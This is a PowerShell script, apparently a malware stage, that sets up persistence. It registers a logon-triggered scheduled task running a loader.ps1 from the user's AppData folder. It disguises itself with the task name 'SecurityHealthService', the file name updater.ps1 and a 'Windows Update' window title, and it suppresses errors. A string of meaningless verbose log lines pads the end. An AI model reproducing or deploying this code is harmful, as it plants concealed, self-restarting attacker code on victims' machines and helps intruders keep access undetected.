<#
.SYNOPSIS
    Scheduled-task persistence workflow.

.DESCRIPTION
    Builds a hidden PowerShell action, registers it against a logon
    trigger with conservative settings, then verifies the task and
    records its state in a small report.

.NOTES
    The task runs in the current user context.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$TaskName = 'SecurityHealthService',
    [string]$ScriptPath = "$env:APPDATA\loader.ps1",
    [string]$LogPath = "$env:TEMP\stage.log",
    [int]$StartDelayMinutes = 8
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Action builder
function New-StageTaskAction {
    [CmdletBinding()]
    param(
        [string]$TargetScript = ""
    )

    Write-Verbose ("Building action for " + $TargetScript)
    $Argument = "-NoP -File `"" + $TargetScript + "`""
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Argument
    return $Action
}

# Registration
function Register-StagePersistence {
    [CmdletBinding()]
    param(
        [string]$TaskName = '',
        [string]$ScriptPath = ""
    )

    $Action = New-StageTaskAction -TargetScript $ScriptPath
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force -ErrorAction SilentlyContinue
    return (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
}

Write-StageLog -Message "Starting scheduled-task stage"
$TaskObject = Register-StagePersistence -TaskName $TaskName -ScriptPath $ScriptPath
Write-StageLog -Message ("Task state: " + $TaskObject.State)

$TaskReport = [ordered]@{
    Stage = "scheduled-task"
    TaskName = $TaskName
    ScriptPath = $ScriptPath
    DelayMinutes = $StartDelayMinutes
}
$TaskReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Retry budget remaining"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Preparing working directory"
Write-Verbose "Reading configuration values"
Write-Verbose "Collecting host metadata"
Write-Verbose "Checking local path"
Write-Verbose "Resolving configured target"
Write-Verbose "Operation completed"
Write-Verbose "Validating result"
Write-Verbose "Applying operation timeout"
$Host.UI.RawUI.WindowTitle = "Windows Update"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
